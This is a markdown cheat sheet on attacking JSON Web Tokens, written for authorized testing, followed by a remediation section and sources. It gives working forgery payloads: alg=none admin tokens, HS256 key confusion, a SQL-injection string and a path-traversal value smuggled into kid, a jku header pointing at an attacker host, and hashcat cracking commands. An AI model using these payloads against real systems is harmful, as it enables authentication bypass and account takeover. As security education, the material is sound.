# JWT Attacks

> JSON Web Token forgery / verification bypass. Authorized testing only. Map: PortSwigger Web Security Academy — JWT, CWE-345 Insufficient Verification of Data Authenticity.

## TL;DR
- A JWT is `header.payload.signature` (base64url-encoded JSON segments + a signature over the first two).
- Attack categories:
  - **`alg` confusion** — `alg=none`, `alg=HS256` with the public key as the HMAC secret.
  - **`kid` injection** — SQL/path traversal/SSRF in the key identifier.
  - **JWK injection** — embed an attacker-controlled public key in the JWT header.
  - **Weak HMAC secret** — brute-force `HS256`.
  - **Algorithm downgrade** — server accepts what the JWT claims.
- Five-second smoke check on every JWT-using app: decode the token, try `alg=none`, try replaying with `alg=HS256` against the server's public key.

## Detection / Discovery

### Decode a JWT
```bash
# CLI: split, base64url-decode each segment
jwt='eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.sig'
echo "$jwt" | cut -d. -f1 | base64 -d 2>/dev/null
echo "$jwt" | cut -d. -f2 | base64 -d 2>/dev/null

# Or use jwt.io (paste; runs client-side) — never paste production prod tokens
# Or use jwt_tool: https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <jwt>
```

### Surface to look for
- Login / refresh flow — what `alg` does the server return?
- Public-key location — JWKS endpoint? Often at `/.well-known/jwks.json`.
- `kid` claim format — UUID / short string / path-like / URL?
- `jku` / `x5u` header — JWT carries a URL to fetch the verifier's key (SSRF + key-substitution opportunity).

## Exploitation

### `alg=none`
Servers that read `alg` from the JWT header and call a generic verifier may accept `none`:
```
{ "alg": "none", "typ": "JWT" }
.
{ "sub": "admin", "role": "admin" }
.
```
Note the empty signature. Encode and send. Variants the spec leaves to libraries — `None`, `NONE`, `nOne`, `null`, mixed-case, or the empty string.

### `HS256` with the server's public key as the HMAC secret
If the server normally verifies `RS256` (asymmetric) but accepts whatever `alg` the JWT carries, switch to `HS256` and HMAC-sign with the *public key*:
```bash
# Get the public key from JWKS or HTTPS cert
curl -s https://target/.well-known/jwks.json | jq -r '.keys[0]'
# Convert JWK to PEM (using jwt_tool or Python jose)
# Sign with HS256 using the PEM as the symmetric secret
python3 jwt_tool.py <jwt> -X k -pk public.pem
```
The server validates the HMAC with the public key (which it has) → token accepted as if signed.

### `kid` injection
The `kid` header points at the key the server should use. If the server does `db.query("SELECT key FROM keys WHERE id='" + kid + "'")` or `open("/keys/" + kid)` without sanitisation, attacker controls the key:
- SQL injection: `kid = "x' UNION SELECT 'AAAA'-- -"` → server uses `AAAA` as HMAC secret; sign your JWT with the same.
- Path traversal: `kid = "../../../dev/null"` → secret is empty bytes; sign with empty HMAC key.
- SSRF: `kid = "http://attacker/key"` (if server fetches via URL) → server uses attacker-controlled key.

### `jku` / `x5u` header — key substitution
Some libraries naively follow `jku` (JWK URL) header. Host your own JWKS, point `jku` at it, sign the JWT with the matching private key.
```
{ "alg": "RS256", "kid": "evilkey", "jku": "https://attacker.tld/jwks.json", "typ": "JWT" }
```
Server fetches JWKS → finds matching `kid` → verifies. Mitigation: server should ignore `jku` and pin to its own well-known JWKS URL.

### JWK injection (`jwk` header)
Embed the attacker's public key directly in the JWT header:
```
{ "alg": "RS256", "jwk": { "kty": "RSA", "n": "<attacker-n>", "e": "AQAB" }, "typ": "JWT" }
```
Server uses the embedded key to verify → attacker signed with the matching private key → accepted. Same naive-library class as `jku`.

### Weak HMAC secret brute force
```bash
# hashcat -m 16500
echo "<jwt>" > jwt.txt
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
# Or john the ripper format=HMAC-SHA256
```
Servers using `HS256` with a 6-character secret like `secret` get cracked in seconds. Test with `jwt_tool`'s built-in cracker too.

### Other patches worth checking
- `iat`/`exp` not validated → forever-valid tokens.
- Replay across endpoints — tokens scoped to `aud=service-a` accepted by `service-b`.
- `nbf` future-dated — sometimes ignored.
- Token revocation list (`jti` blacklist) not consulted → logout doesn't actually log out.

## Bypasses
- WAF strips `alg=none` payloads — encode as `bm9uZQ==` (base64) or mix case `nOnE`.
- Server has multiple JWT verification paths (cookie + Authorization header) with different code; one is hardened, the other isn't.
- Token signed correctly but signed by the *test* signing key still trusted in prod (separate-tenancy mistake).

## Defence / Remediation
- **Pin the algorithm server-side** — don't read `alg` from the token, hard-code `verify(token, expected_alg='RS256', key=server_public_key)`. CWE-345.
- **Ignore `jku`, `jwk`, `x5u`, `x5c` headers** during signature verification unless you have an explicit allow-list URL.
- **Validate `kid`** against a known-key store (UUID, lookup by exact match, no string concatenation into SQL/path).
- **HMAC secrets ≥ 256 bits of entropy** (32 random bytes); rotate periodically. Better: avoid HS* in production — use RS256/ES256 with KMS-managed keys.
- **Validate every claim**: `iss`, `aud`, `exp`, `nbf`, `iat`. Reject tokens missing required claims.
- **Use a maintained library** that defaults to safe behaviour (`jose` for Node, PyJWT 2.x with explicit `algorithms=['RS256']`, `jjwt` for Java). Avoid hand-rolled JWT validation.
- **Short expiry** + refresh-token rotation; revocation tracked server-side (jti or per-user incrementing counter).

## Sources
- PortSwigger — JWT attacks: https://portswigger.net/web-security/jwt
- jwt.io — debugger + algorithm reference: https://jwt.io/
- jwt_tool (ticarpi): https://github.com/ticarpi/jwt_tool
- PayloadsAllTheThings — JSON Web Token: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
- OWASP JWT Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- HackTricks JWT: https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
- IETF RFC 7519 (JWT) / 7515 (JWS) / 7517 (JWK): https://datatracker.ietf.org/doc/html/rfc7519
- CWE-345 Insufficient Verification of Data Authenticity: https://cwe.mitre.org/data/definitions/345.html
